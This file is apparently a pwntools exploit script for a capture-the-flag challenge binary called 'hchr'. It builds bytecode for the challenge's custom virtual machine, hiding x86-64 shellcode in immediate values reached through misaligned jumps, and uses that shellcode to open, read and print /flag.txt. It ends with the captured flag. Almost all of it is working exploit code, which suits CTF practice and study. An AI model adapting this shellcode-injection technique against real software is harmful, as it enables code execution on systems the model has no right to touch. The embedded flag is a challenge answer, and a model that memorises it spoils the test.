from pwn import *

# context.gdb_binary = "/usr/local/bin/pwndbg"

gdbscript = """
b *$rebase(0x0000000000018D3B)
c
"""

import socks
import socket

HOST="172.31.14.12"
PORT=9999


import struct

class Assembler:
    def __init__(self):
        self.code = bytearray()

    def _reg_check(self, reg):
        if not (0 <= reg <= 3):
            raise ValueError("Register must be between 0 and 3")
        return reg

    def load_imm(self, reg, val):
        self.code.append(0x01)
        self.code.append(self._reg_check(reg))
        self.code.append(0x04)
        self.code.extend(struct.pack('<I', val & 0xFFFFFFFF))

    def mov(self, dst, src):
        self.code.extend([0x02, self._reg_check(dst), self._reg_check(src)])

    def add(self, dst, src):
        self.code.extend([0x11, self._reg_check(dst), self._reg_check(src)])

    def sub(self, dst, src):
        self.code.extend([0x12, self._reg_check(dst), self._reg_check(src)])

    def bitand(self, dst, src):
        self.code.extend([0x21, self._reg_check(dst), self._reg_check(src)])

    def bitor(self, dst, src):
        self.code.extend([0x22, self._reg_check(dst), self._reg_check(src)])

    def bitxor(self, dst, src):
        self.code.extend([0x23, self._reg_check(dst), self._reg_check(src)])

    def cmp(self, dst, src):
        self.code.extend([0x31, self._reg_check(dst), self._reg_check(src)])

    def jmp(self, offset):
        self.code.append(0x41)
        self.code.append(struct.pack('b', offset)[0])

    def jz(self, offset):
        self.code.append(0x42)
        self.code.append(struct.pack('b', offset)[0])

    def jnz(self, offset):
        self.code.append(0x43)
        self.code.append(offset)

    def get_bytes(self):
        return bytes(self.code)
    
# 0: rax
# 1: rcx
# 2: rdx
# 3: rbx
# socket.socket = socks.socksocket
if args.REMOTE: io = remote(HOST, PORT)
else: io = process('./hchr')

context.log_level = 'debug'
if args.GDB: gdb.attach(io, api=True, gdbscript=gdbscript)

shell = Assembler()
shell.load_imm(0, u32(b'/fla'))
shell.load_imm(1, u32(b'g.tx'))
shell.load_imm(2, 101)
shell.load_imm(3, 1)
shell.sub(2, 3)
shell.cmp(2, 3)
shell.jnz(256 - (2 + 3 + 3))
# for i in range(0x2 - 1): shell.add(2, 3) # 2: 0x3b
shell.mov(0, 2)
shell.add(0, 3)
shell.jmp(3)
shell.load_imm(0, u32(b'\x57\x5a\x90\x90'))
for i in range(8): shell.add(2, 3)
shell.jmp(3)
shell.load_imm(0, u32(b'\xc6\x02\x74\x90'))
shell.sub(2,2)
shell.jmp(3)
shell.load_imm(0, u32(b'\x0f\x05\x90\x90')) # syscall open
shell.mov(2, 1)
shell.jmp(3)
shell.load_imm(0, u32(b'\x48\x89\xfe\x90')) # mov rsi, rdi
shell.jmp(3)
shell.load_imm(0, u32(b'\x48\x89\xc7\x90')) # mov rdi, rax
shell.sub(0, 0)
shell.jmp(3)
shell.load_imm(0, u32(b'\x0f\x05\x90\x90')) # syscall read
shell.jmp(3)
shell.load_imm(0, u32(b'\x48\x31\xff\x90')) # xor rdi, rdi
shell.jmp(3)
shell.load_imm(0, u32(b'\x48\x89\xdf\x90')) # mov rdi, rbx
shell.mov(0, 3)
shell.jmp(3)
shell.load_imm(0, u32(b'\x0f\x05\x90\x90')) # syscall write
# sys.stdout.buffer.write(shell.get_bytes())
io.send(shell.get_bytes())
io.shutdown('send')

print(io.recvall())

#flag{Sm2u9EGgeoieEokGjKUhnD5s1xV7gItF} 